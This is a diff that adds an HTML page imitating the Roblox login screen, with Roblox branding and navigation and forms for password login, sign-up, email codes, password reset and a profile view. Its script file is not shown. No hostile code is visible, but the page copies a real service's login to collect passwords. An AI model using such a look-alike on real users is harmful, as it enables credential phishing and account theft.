@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in to Roblox</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <nav class="navbar">
+        <div class="navbar-logo">
+            <svg viewBox="0 0 30 30" fill="white">
+                <rect x="4" y="4" width="22" height="22" rx="3" fill="none" stroke="white" stroke-width="3"/>
+                <rect x="10" y="10" width="10" height="10" rx="1" fill="white"/>
+            </svg>
+        </div>
+        <div class="nav-links">
+            <a href="#">Charts</a>
+            <a href="#">Marketplace</a>
+            <a href="#">Create</a>
+            <a href="#">Robux</a>
+        </div>
+        <div class="search-bar">
+            <svg viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27A6.47 6.47 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>
+            <input type="text" placeholder="Search">
+        </div>
+        <button class="btn-signup" onclick="showRegister()">Sign Up</button>
+    </nav>
+
+    <div class="game-background" id="gameBackground"></div>
+    <div class="overlay"></div>
+
+    <div class="login-container" id="loginContainer">
+        <h1>Login to Roblox</h1>
+        
+        <div id="loginForm">
+            <div class="input-group">
+                <input type="text" id="loginIdentifier" placeholder="Username/Email/Phone">
+            </div>
+            <div class="input-group">
+                <input type="password" id="loginPassword" placeholder="Password">
+            </div>
+            <button class="btn-login" onclick="handleLogin()">Log In</button>
+            <a href="#" class="forgot-link" onclick="showForgotPassword()">Forgot Password or Username?</a>
+            
+            <div class="divider"></div>
+            
+            <button class="btn-secondary" onclick="showOTPRequest()">Email Me a One-Time Code</button>
+            <button class="btn-secondary" onclick="showQuickLogin()">Quick Sign-in</button>
+            
+            <p class="signup-text">
+                Don't have an account? <a href="#" onclick="showRegister()">Sign Up</a>
+            </p>
+        </div>
+
+        <div id="registerForm" style="display: none;">
+            <div class="input-group">
+                <input type="text" id="regUsername" placeholder="Username">
+            </div>
+            <div class="input-group">
+                <input type="email" id="regEmail" placeholder="Email">
+            </div>
+            <div class="input-group">
+                <input type="tel" id="regPhone" placeholder="Phone (optional)">
+            </div>
+            <div class="input-group">
+                <input type="password" id="regPassword" placeholder="Password (min 6 characters)">
+            </div>
+            <button class="btn-login" onclick="handleRegister()">Sign Up</button>
+            <p class="signup-text">
+                Already have an account? <a href="#" onclick="showLogin()">Log In</a>
+            </p>
+        </div>
+
+        <div id="otpForm" style="display: none;">
+            <div class="input-group">
+                <input type="email" id="otpEmail" placeholder="Enter your email">
+            </div>
+            <button class="btn-login" onclick="sendOTPCode()">Send Code</button>
+            
+            <div id="otpCodeInput" style="display: none; margin-top: 15px;">
+                <div class="input-group">
+                    <input type="text" id="otpCode" placeholder="Enter 6-digit code">
+                </div>
+                <button class="btn-login" onclick="verifyOTPForLogin()">Verify & Login</button>
+            </div>
+            
+            <p class="signup-text">
+                <a href="#" onclick="showLogin()">← Back to login</a>
+            </p>
+        </div>
+
+        <div id="quickLoginForm" style="display: none;">
+            <div class="input-group">
+                <input type="email" id="quickEmail" placeholder="Enter your email">
+            </div>
+            <button class="btn-login" onclick="sendQuickLoginCode()">Send Code</button>
+            
+            <div id="quickCodeInput" style="display: none; margin-top: 15px;">
+                <div class="input-group">
+                    <input type="text" id="quickCode" placeholder="Enter 6-digit code">
+                </div>
+                <button class="btn-login" onclick="handleQuickLogin()">Login with Code</button>
+            </div>
+            
+            <p class="signup-text">
+                <a href="#" onclick="showLogin()">← Back to login</a>
+            </p>
+        </div>
+
+        <div id="forgotForm" style="display: none;">
+            <div class="input-group">
+                <input type="email" id="forgotEmail" placeholder="Enter your email">
+            </div>
+            <button class="btn-login" onclick="handleForgotPassword()">Send Reset Link</button>
+            <p class="signup-text">
+                <a href="#" onclick="showLogin()">← Back to login</a>
+            </p>
+        </div>
+
+        <div id="message" class="message"></div>
+    </div>
+
+    <div class="reset-container" id="resetContainer" style="display: none;">
+        <h1>Reset Password</h1>
+        <div class="input-group">
+            <input type="password" id="newPassword" placeholder="New Password">
+        </div>
+        <div class="input-group">
+            <input type="password" id="confirmPassword" placeholder="Confirm Password">
+        </div>
+        <button class="btn-login" onclick="handleResetPassword()">Change Password</button>
+    </div>
+
+    <div class="profile-container" id="profileContainer" style="display: none;">
+        <h1>Welcome, <span id="profileUsername"></span>!</h1>
+        <p>Email: <span id="profileEmail"></span></p>
+        <p>Member since: <span id="profileCreated"></span></p>
+        <p>Last login: <span id="profileLastLogin"></span></p>
+        <button class="btn-login" onclick="handleLogout()">Logout</button>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
